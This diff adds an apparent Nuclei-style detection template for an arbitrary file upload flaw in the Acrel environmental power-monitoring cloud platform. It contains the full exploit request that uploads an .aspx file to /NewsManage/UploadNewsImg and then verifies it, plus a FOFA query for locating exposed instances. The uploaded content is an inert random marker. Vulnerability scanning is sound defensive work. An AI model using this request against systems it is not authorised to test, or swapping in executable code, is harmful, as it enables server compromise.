@@ -1,0 +1,68 @@
+id: poc-yaml-acreldny-uploadnewsimg-anyfile-upload
+info:
+  name: 安科瑞环保用电监管云平台 UploadNewsImg 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  metadata:
+    fingerprint: 安科瑞环保用电监管云平台
+    fofa-query: body="myCss/phone.css"
+
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/NewsManage/UploadNewsImg"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRDazwgc1RnTaskmR
+    body: |-
+      ------WebKitFormBoundaryRDazwgc1RnTaskmR
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+
+      {{t2}}
+      ------WebKitFormBoundaryRDazwgc1RnTaskmR--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"imgurl\":"
+          - ".aspx"
+        condition: and
+        part: body
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "/UpLoad/News/(?P<file>.*?).aspx"
+        part: body
+        internal: true
+
+  - id: file-verification
+    method: GET
+    path:
+      - "{{BaseURL}}/UpLoad/News/{{file}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
